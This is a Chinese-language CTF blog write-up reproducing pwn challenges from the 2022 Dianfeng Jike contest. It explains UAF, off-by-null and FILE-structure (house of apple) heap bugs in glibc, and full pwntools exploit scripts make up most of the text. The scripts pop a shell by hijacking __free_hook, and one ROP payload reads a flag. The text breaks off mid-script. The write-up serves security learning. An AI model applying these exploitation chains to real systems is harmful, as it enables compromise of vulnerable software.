<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rdi\nret&quot;</span>)))</span><br><span class="line">pop_rsi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rsi\nret&quot;</span>)))</span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x000000000011c371</span></span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ope = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line"><span class="comment">#0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; </span></span><br><span class="line">gadget = libc_base + <span class="number">0x0000000000154930</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000025679</span></span><br><span class="line"></span><br><span class="line">heap_addr = heap_base + <span class="number">0x2a0</span></span><br><span class="line">flag_addr = heap_addr + <span class="number">0x10</span></span><br><span class="line">orw_addr = heap_addr + <span class="number">0xb8</span></span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(ope)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heap_base) + p64(pop_rdx_r12) + p64(<span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(read)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(heap_base) + p64(pop_rdx_r12) + p64(<span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(write)</span><br><span class="line"></span><br><span class="line">payload = p64(heap_addr + <span class="number">0x10</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_addr)</span><br><span class="line">payload += <span class="string">b&#x27;flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(setcontext+<span class="number">61</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(orw_addr)<span class="comment">#rsp</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += orw</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">2022巅峰极客复现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-18 15:02:33" itemprop="dateCreated datePublished" datetime="2022-08-18T15:02:33+08:00">2022-08-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-09-11 13:10:59" itemprop="dateModified" datetime="2022-09-11T13:10:59+08:00">2022-09-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h2><p>漏洞：UAF</p>
<p>比赛时这题是没给libc版本的，而从TeamGipsy战队中的wp中学习到可以通过libc大版本间的明显差异来大概确定是什么版本的</p>
<blockquote>
<p>测heap的fd指针没有key加密可以看出是libc2.31以下，再是通过tcache struct的结构不是两个字节确定大小所以是2.29以下再随便通过一个libc2.27.so,1.5版本</p>
</blockquote>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>add最多十次，只能malloc(0x100)和malloc(0x60)二选一，delete存在UAF，还有show功能，无edit，此外还有一个函数如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_QWORD *<span class="title">bargain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index?&quot;</span>);</span><br><span class="line">  num = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( num &lt;= <span class="number">10</span> &amp;&amp; num &gt;= <span class="number">0</span> &amp;&amp; gift_list[num] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( chance ) <span class="meta">#default chance == 1</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;No baipiao!!!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;How much?&quot;</span>);</span><br><span class="line">    v2 = read_num();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt; <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;No baipiao!!!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Well......ok&quot;</span>);</span><br><span class="line">    result = gift_list[num];</span><br><span class="line">    *result -= v2;</span><br><span class="line">    chance = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数的功能就是让chunk中第一项减少num值，因为UAF的存在，所以可以用这个函数来改fd的值，虽然其最多只能使fd减小0x10，但是其没有限制我们输入负数，所以可以用这个函数构造堆重叠，利用堆重叠去劫持fd指针，例如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcachebin</span><br><span class="line">#0x110 [  2]: 0x55d6355c6370 —▸ 0x55d6355c6260 ◂— 0x0</span><br></pre></td></tr></table></figure>

<p>可以利用该函数将tcachebin改成如下之类的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcachebin</span><br><span class="line">#0x110 [  2]: 0x55d6355c6370 —▸ 0x55d6355c6330 ◂— 0x0</span><br></pre></td></tr></table></figure>

<p>然后去打tcache struct就行了，2.27很简单</p>
<p>复现的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,28612)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;!&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bar</span>(<span class="params">index,num</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="comment">#1 = 0x100</span></span><br><span class="line"><span class="comment">#2 = 0x60</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0x111</span>)*<span class="number">30</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;cost: &quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">10</span>) - <span class="number">0x260</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x110 [  2]: 0x55d6355c6370 —▸ 0x55d6355c6260 ◂— 0x0</span></span><br><span class="line">bar(<span class="number">1</span>,-<span class="number">0xa0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">11</span> + p64(<span class="number">0x111</span>) + p64(heap_base)) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#5</span></span><br><span class="line">payload = p64(<span class="number">0x50000000000</span>) + p64(<span class="number">0x700000000000000</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">1</span>,payload) <span class="comment">#point to tcache struct 6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;cost: &quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">10</span>) - (<span class="number">0x7fa7d67c8ca0</span> - <span class="number">0x00007fa7d63dd000</span>)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one = [<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">og = libc_base + one[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(free_hook-<span class="number">0x10</span>)) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">2</span>,p64(og))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="smallcontainer"><a href="#smallcontainer" class="headerlink" title="smallcontainer"></a>smallcontainer</h2><p>漏洞：off-by-null</p>
<p>版本：glibc-2.27</p>
<p>菜单：add、delete、show、edit</p>
<h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>add的大小为0x100—0x3FF，同时add只申请堆块不写入内容，delete和show都正常</p>
<p>edit的最后有个函数会把全部’\x11’改成’\x00’，很明显的off-by-null</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">check</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *a1;</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="string">&#x27;\x11&#x27;</span> )</span><br><span class="line">      *a1 = <span class="number">0</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因为没有能直接free到unsorted bin的chunk，所以直接先把两个大小的tcache bin给填满，一个用来触发unlink，另一个用来满足unlink的条件</p>
<p>因为这个off-by-null是把’\x11’改成’\x00’，所以需要在chunk的最后一段伪造一个size来补上少的那节</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./smallcontainer&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./smallcontainer&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,28612)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x108</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x300</span>) <span class="comment">#9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	free(i) <span class="comment">#full of 0x110</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0x2f0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>)	<span class="comment">#off by null</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x100</span> + p64(<span class="number">0x220</span>))</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x2f0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x11</span>))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">p.recv(<span class="number">1</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - (<span class="number">0x7f3c4556aca0</span> - <span class="number">0x00007f3c4517f000</span>)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">9</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(system))</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="happy-note"><a href="#happy-note" class="headerlink" title="happy_note"></a>happy_note</h2><p>做这道题发现到目前为止一直有个误区，就是以为FILE结构本身是不可写的，复现这题的时候才发现一直都理解错了，FILE结构所在的libc段是必然有写入权限的，例如新增FILE结构时就需要修改<code>_IO_list_all</code>指针。所以FILE结构中的所有成员变量（包括虚表指针）本身都是可以被修改的，只不过原本虚表指针指向的结构体从2.23开始变得不可写了而已。</p>
<p>如果程序本身的漏洞可以让我们做到任意地址申请的话，那么大可以直接申请到某个FILE结构中直接构造。</p>
<h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>版本：glibc-2.34</p>
<p>add有两次malloc和不限制的calloc，大小不大于0x200，delete和show正常，另外独出来一个只能用一次的UAF。能显式调用exit。</p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>先把tcache填满，UAF将chunk free到unsorted bin里拿到libc地址。因为有edit，所以可以将这个UAF的大chunk割成两块，将小chunk free掉，edit大chunk来将小chunk的prev size和size字段填充满，以此泄露出heap基址，泄漏完后有需要再改回去就行了。</p>
<p>最后在FILE结构出申请出chunk，随便找一条能用的链即可（这里用的house of apple）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./happy_note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./happy_note&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,28612)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,index,mode</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;[1] or [2]&quot;</span>,<span class="built_in">str</span>(mode))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span 